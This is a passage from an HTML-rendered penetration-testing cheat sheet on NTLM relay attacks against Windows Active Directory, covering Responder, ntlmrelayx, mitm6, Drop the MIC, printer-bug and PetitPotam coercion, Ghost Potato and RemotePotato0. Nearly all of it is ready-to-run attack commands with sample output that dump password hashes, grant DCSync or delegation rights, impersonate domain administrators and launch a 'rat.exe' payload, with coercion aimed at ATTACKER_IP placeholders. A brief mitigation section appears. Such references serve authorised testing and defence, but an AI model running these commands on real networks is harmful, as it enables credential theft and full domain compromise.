<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">;</span> <span class="n">Servers</span> <span class="n">to</span> <span class="nb">start</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="p">...</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">SMB</span> <span class="p">=</span> <span class="n">Off</span>     <span class="c"># Turn this off</span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">HTTP</span> <span class="p">=</span> <span class="n">Off</span>    <span class="c"># Turn this off</span>
</code></pre></div></li>
<li>Run <code>python  RunFinger.py -i IP_Range</code> to detect machine with <code>SMB signing</code>:<code>disabled</code>.</li>
<li>Run <code>python Responder.py -I &lt;interface_card&gt;</code> </li>
<li>Use a relay tool such as <code>ntlmrelayx</code> or <code>MultiRelay</code><ul>
<li><code>impacket-ntlmrelayx -tf targets.txt</code> to dump the SAM database of the targets in the list. </li>
<li><code>python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code></li>
</ul>
</li>
<li>ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">$</span> <span class="n">impacket-ntlmrelayx</span> <span class="n">-tf</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">targets</span><span class="p">.</span><span class="n">txt</span> <span class="n">-socks</span> <span class="n">-smb2support</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">[*]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">Type </span><span class="n">help</span> <span class="k">for</span> <span class="n">list</span> <span class="n">of</span> <span class="n">commands</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">ntlmrelayx</span><span class="p">&gt;</span> <span class="n">socks</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">Protocol</span>  <span class="n">Target</span>          <span class="n">Username</span>                  <span class="n">Port</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="p">--------</span>  <span class="p">--------------</span>  <span class="p">------------------------</span>  <span class="p">----</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">MSSQL</span>     <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span>  <span class="n">VULNERABLE</span><span class="p">/</span><span class="n">ADMINISTRATOR</span>  <span class="n">1433</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">SMB</span>       <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span>  <span class="n">CONTOSO</span><span class="p">/</span><span class="n">NORMALUSER1</span>       <span class="n">445</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">MSSQL</span>     <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span>  <span class="n">CONTOSO</span><span class="p">/</span><span class="n">NORMALUSER1</span>       <span class="n">1433</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="c"># You might need to select a target with &quot;-t&quot;</span>
<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="c"># smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://</span>
<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="n">impacket-ntlmrelayx</span> <span class="n">-t</span> <span class="n">mssql</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-socks</span> <span class="n">-smb2support</span>
<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="n">impacket-ntlmrelayx</span> <span class="n">-t</span> <span class="n">smb</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-socks</span> <span class="n">-smb2support</span>
<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>
<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="c"># the socks proxy can then be used with your Impacket tools or CrackMapExec</span>
<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="p">$</span> <span class="n">proxychains</span> <span class="n">impacket-smbclient</span> <span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">230</span><span class="p">/</span><span class="n">Users</span> <span class="n">-U</span> <span class="n">contoso</span><span class="p">/</span><span class="n">normaluser1</span>
<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="p">$</span> <span class="n">proxychains</span> <span class="n">impacket-mssqlclient</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">USER</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-windows-auth</span>
<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="p">$</span> <span class="n">proxychains</span> <span class="n">crackmapexec</span> <span class="n">mssql</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="s1">&#39;&#39;</span> <span class="n">-d</span> <span class="n">DOMAIN</span> <span class="n">-q</span> <span class="s2">&quot;SELECT 1&quot;</span>   
</code></pre></div></li>
</ol>
<p><strong>Mitigations</strong>:</p>
<ul>
<li>Disable LLMNR via group policy
    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">Open</span> <span class="n">gpedit</span><span class="p">.</span><span class="n">msc</span> <span class="n">and</span> <span class="n">navigate</span> <span class="n">to</span> <span class="n">Computer</span> <span class="n">Configuration</span> <span class="p">&gt;</span> <span class="n">Administrative</span> <span class="n">Templates</span> <span class="p">&gt;</span> <span class="n">Network</span> <span class="p">&gt;</span> <span class="n">DNS</span> <span class="n">Client</span> <span class="p">&gt;</span> <span class="n">Turn</span> <span class="n">off</span> <span class="n">multicast</span> <span class="n">name</span> <span class="n">resolution</span> <span class="n">and</span> <span class="nb">set </span><span class="n">to</span> <span class="n">Enabled</span>
</code></pre></div></li>
<li>Disable NBT-NS
    <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">achieved</span> <span class="n">by</span> <span class="n">navigating</span> <span class="n">through</span> <span class="n">the</span> <span class="n">GUI</span> <span class="n">to</span> <span class="n">Network</span> <span class="n">card</span> <span class="p">&gt;</span> <span class="n">Properties</span> <span class="p">&gt;</span> <span class="n">IPv4</span> <span class="p">&gt;</span> <span class="n">Advanced</span> <span class="p">&gt;</span> <span class="n">WINS</span> <span class="n">and</span> <span class="n">then</span> <span class="n">under</span> <span class="s2">&quot;NetBIOS setting&quot;</span> <span class="nb">select </span><span class="n">Disable</span> <span class="n">NetBIOS</span> <span class="n">over</span> <span class="n">TCP</span><span class="p">/</span><span class="n">IP</span>
</code></pre></div></li>
</ul>
<h2 id="smb-signing-disabled-and-ipv6">SMB Signing Disabled and IPv6</h2>
<p>Since <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077">MS16-077</a> the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$hosts</span> <span class="p">-</span><span class="n">-gen-relay-list</span> <span class="n">relay</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c"># DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c"># -d is the domain name that we filter our request on - the attacked domain</span>
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c"># -i is the interface we have mitm6 listen on for events</span>
<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">mitm6</span> <span class="n">-i</span> <span class="n">eth0</span> <span class="n">-d</span> <span class="nv">$domain</span>
<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c"># spoofing WPAD and relaying NTLM credentials</span>
<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">impacket-ntlmrelayx</span> <span class="p">-</span><span class="n">6</span> <span class="n">-wh</span> <span class="nv">$attacker_ip</span> <span class="n">-of</span> <span class="n">loot</span> <span class="n">-tf</span> <span class="n">relay</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="n">impacket-ntlmrelayx</span> <span class="p">-</span><span class="n">6</span> <span class="n">-wh</span> <span class="nv">$attacker_ip</span> <span class="n">-l</span> <span class="p">/</span><span class="n">tmp</span> <span class="n">-socks</span> <span class="n">-debug</span>
<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="c"># -ip is the interface you want the relay to run on</span>
<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="c"># -wh is for WPAD host, specifying your wpad file to serve</span>
<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="c"># -t is the target where you want to relay to. </span>
<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="n">impacket-ntlmrelayx</span> <span class="n">-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">1</span> <span class="n">-wh</span> <span class="nv">$attacker_ip</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">2</span>
</code></pre></div>
<h2 id="drop-the-mic">Drop the MIC</h2>
<blockquote>
<p>The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP</p>
</blockquote>
<p>Check vulnerability with <a href="https://github.com/fox-it/cve-2019-1040-scanner">cve-2019-1040-scanner</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">python2</span> <span class="n">scanMIC</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;DOMAIN/USERNAME:PASSWORD@TARGET&#39;</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="p">[*]</span> <span class="n">CVE</span><span class="p">-</span><span class="n">2019</span><span class="p">-</span><span class="n">1040</span> <span class="n">scanner</span> <span class="n">by</span> <span class="nv">@_dirkjan</span> <span class="p">/</span> <span class="n">Fox-IT</span> <span class="p">-</span> <span class="n">Based</span> <span class="n">on</span> <span class="n">impacket</span> <span class="n">by</span> <span class="n">SecureAuth</span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="p">[*]</span> <span class="n">Target</span> <span class="n">TARGET</span> <span class="n">is</span> <span class="n">not</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">CVE</span><span class="p">-</span><span class="n">2019</span><span class="p">-</span><span class="n">1040</span> <span class="p">(</span><span class="n">authentication</span> <span class="n">was</span> <span class="n">rejected</span><span class="p">)</span>
</code></pre></div>
<ul>
<li>
<p>Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
    <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">python</span> <span class="n">printerbug</span><span class="p">.</span><span class="n">py</span> <span class="n">testsegment</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span><span class="nv">@s2012exc</span><span class="p">.</span><span class="n">testsegment</span><span class="p">.</span><span class="n">local</span> <span class="p">&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">/</span><span class="n">hostname</span><span class="p">&gt;</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">TERM2</span><span class="p">&gt;</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-remove-mic</span> <span class="p">-</span><span class="n">-escalate-user</span> <span class="n">ntu</span> <span class="n">-t</span> <span class="n">ldap</span><span class="p">://</span><span class="n">s2016dc</span><span class="p">.</span><span class="n">testsegment</span><span class="p">.</span><span class="n">local</span> <span class="n">-smb2support</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">testsegment</span><span class="p">/</span><span class="n">ntu</span><span class="nv">@s2016dc</span><span class="p">.</span><span class="n">testsegment</span><span class="p">.</span><span class="n">local</span> <span class="n">-just-dc</span>
</code></pre></div></p>
</li>
<li>
<p>Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># create a new machine account</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">rlt-dc</span><span class="p">.</span><span class="n">relaytest</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remove-mic</span> <span class="p">-</span><span class="n">-delegate-access</span> <span class="n">-smb2support</span> 
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">TERM2</span><span class="p">&gt;</span> <span class="n">python</span> <span class="n">printerbug</span><span class="p">.</span><span class="n">py</span> <span class="n">relaytest</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span><span class="nv">@second</span><span class="n">-dc-server</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">6</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">host</span><span class="p">/</span><span class="n">second-dc-server</span><span class="p">.</span><span class="n">local</span> <span class="s1">&#39;relaytest.local/MACHINE$:PASSWORD&#39;</span> <span class="n">-impersonate</span> <span class="n">DOMAIN_ADMIN_USER_NAME</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c"># connect using the ticket</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">DOMAIN_ADMIN_USER_NAME</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">second-dc-server</span><span class="p">.</span><span class="n">local</span> <span class="n">-just-dc</span>
</code></pre></div>
</li>
</ul>
<h2 id="ghost-potato-cve-2019-1384">Ghost Potato - CVE-2019-1384</h2>
<p>Requirements:</p>
<ul>
<li>User must be a member of the local Administrators group</li>
<li>User must be a member of the Backup Operators group</li>
<li>Token must be elevated</li>
</ul>
<p>Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">ntlmrelayx</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-no-smb-server</span> <span class="p">-</span><span class="n">-gpotato-startup</span> <span class="n">rat</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<h2 id="remotepotato0-dcom-dce-rpc-relay">RemotePotato0 DCOM DCE RPC relay</h2>
<blockquote>
<p>It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine</p>
</blockquote>
<p>Requirements:</p>
<ul>
<li>a shell in session 0 (e.g. WinRm shell or SSH shell)</li>
<li>a privileged user is logged on in the session 1 (e.g. a Domain Admin user)</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># https://github.com/antonioCoco/RemotePotato0/</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">Terminal</span><span class="p">&gt;</span> <span class="n">sudo</span> <span class="n">socat</span> <span class="n">TCP-LISTEN</span><span class="p">:</span><span class="n">135</span><span class="p">,</span><span class="n">fork</span><span class="p">,</span><span class="n">reuseaddr</span> <span class="n">TCP</span><span class="p">:</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">83</span><span class="p">.</span><span class="n">131</span><span class="p">:</span><span class="n">9998</span> <span class="p">&amp;</span> <span class="c"># Can be omitted for Windows Server &lt;= 2016</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">Terminal</span><span class="p">&gt;</span> <span class="n">sudo</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldap</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">83</span><span class="p">.</span><span class="n">135</span> <span class="p">-</span><span class="n">-no-wcf-server</span> <span class="p">-</span><span class="n">-escalate-user</span> <span class="n">winrm_user_1</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">Session0</span><span class="p">&gt;</span> <span class="n">RemotePotato0</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">83</span><span class="p">.</span><span class="n">130</span> <span class="n">-p</span> <span class="n">9998</span> <span class="n">-s</span> <span class="n">2</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">Terminal</span><span class="p">&gt;</span> <span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;LAB/winrm_user_1:Password123!@192.168.83.135&#39;</span>
</code></pre></div>
<h2 id="dns-poisonning-relay-delegation-with-mitm6">DNS Poisonning - Relay delegation with mitm6</h2>
<p>Requirements: </p>
<ul>
<li>IPv6 enabled (Windows prefers IPV6 over IPv4)</li>
<li>LDAP over TLS (LDAPS)</li>
</ul>
<blockquote>
<p>ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">fox-it</span><span class="p">/</span><span class="n">mitm6</span><span class="p">.</span><span class="n">git</span> 
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">cd </span><span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">mitm6</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">pip</span> <span class="n">install</span> <span class="p">.</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">mitm6</span> <span class="n">-hw</span> <span class="n">ws02</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-ignore-nofqnd</span>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="c"># -d: the domain name that we filter our request on (the attacked domain)</span>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c"># -i: the interface we have mitm6 listen on for events</span>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="c"># -hw: host whitelist</span>
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-wh</span> <span class="n">attacker-wpad</span>
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-wh</span> <span class="n">attacker-wpad</span> <span class="p">-</span><span class="n">-add-computer</span>
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="c"># -ip: the interface you want the relay to run on</span>
<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="c"># -wh: WPAD host, specifying your wpad file to serve</span>
<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="c"># -t: the target where you want to relay to</span>
<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="c"># now granting delegation rights and then do a RBCD</span>
<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-delegate-access</span> <span class="p">-</span><span class="n">-no-smb-server</span> <span class="n">-wh</span> <span class="n">attacker-wpad</span>
<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">target</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">GENERATED</span><span class="p">\$</span> <span class="n">-impersonate</span> <span class="n">Administrator</span>  
<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">administrator</span><span class="p">.</span><span class="n">ccache</span>  
<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">target</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span>  
</code></pre></div>
<h2 id="relaying-with-webdav-trick">Relaying with WebDav Trick</h2>
<blockquote>
<p>Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB</p>
</blockquote>
<p><strong>Requirement</strong>:</p>
<ul>
<li>WebClient service</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<ul>
<li>Disable HTTP in Responder: <code>sudo vi /usr/share/responder/Responder.conf</code></li>
<li>Generate a Windows machine name: <code>sudo responder -I eth0</code>, e.g: WIN-UBNW4FI3AP0</li>
<li>Prepare for RBCD against the DC: <code>python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support</code></li>
<li>Discover WebDAV services
    <div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">webclientservicescanner</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="s1">&#39;password&#39;</span><span class="p">@</span><span class="s1">&#39;machine&#39;</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="s1">&#39;TARGETS&#39;</span> <span class="n">-d</span> <span class="s1">&#39;domain&#39;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="n">-M</span> <span class="n">webdav</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">GetWebDAVStatus</span><span class="p">.</span><span class="n">exe</span> <span class="s1">&#39;machine&#39;</span>
</code></pre></div></li>
<li>Trigger the authentication to relay to our nltmrelayx: <code>PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4</code>, the listener host must be specified with the FQDN or full netbios name like <code>logger.domain.local@80/test.txt</code>. Specifying the IP results in anonymous auth instead of System. 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c"># PrinterBug</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">dementor</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="s2">&quot;DOMAIN&quot;</span> <span class="n">-u</span> <span class="s2">&quot;USER&quot;</span> <span class="n">-p</span> <span class="s2">&quot;PASSWORD&quot;</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;ATTACKER_IP&quot;</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="c"># PetitPotam</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">Petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="n">Petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="s2">&quot;DOMAIN&quot;</span> <span class="n">-u</span> <span class="s2">&quot;USER&quot;</span> <span class="n">-p</span> <span class="s2">&quot;PASSWORD&quot;</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
